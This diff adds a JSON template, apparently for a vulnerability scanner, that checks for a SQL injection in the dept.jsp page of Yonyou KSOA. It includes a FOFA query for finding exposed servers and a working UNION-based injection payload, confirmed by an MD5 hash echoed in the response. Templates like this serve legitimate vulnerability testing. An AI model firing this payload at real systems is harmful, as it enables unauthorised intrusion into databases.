@@ -1,0 +1,33 @@
+{
+  "product": "用友时空KSOA",
+  "vul_name": "用友时空KSOA dept.jsp SQL注入漏洞",
+  "type": "SQL注入",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "用友时空KSOA是建立在SOA理念指导下研发的新一代产品，是根据流通企业最前沿的I需求推出的统一的IT基础架构，它可以让流通企业各个时期建立的IT系统之间彼此轻松对话，帮助流通企业保护原有的IT投资，简化IT管理，提升竞争能力，确保企业整体的战略目标以及创新活动的实现。系统dept.jsp文件中参数存在SQL注入漏洞",
+  "version": "用友时空 KSOA v9.0 v8.3",
+  "note": "",
+  "search": {
+    "FOFA": "app=\"用友-时空KSOA\""
+  },
+  "protocol": "http",
+  "link": "https://www.cnblogs.com/pursue-security/p/17775843.html",
+  "fix": [],
+  "exploit": {
+    "exp": {
+      "method": "get",
+      "follow": false,
+      "path": "/common/dept.jsp?deptid=1' UNION ALL SELECT 60%2Csys.fn_sqlvarbasetostr(HASHBYTES('MD5'%2C'123456'))--"
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "status": 200,
+          "body": "e10adc3949ba59abbe56e057f20f883e"
+        }
+      ]
+    }
+  }
+}
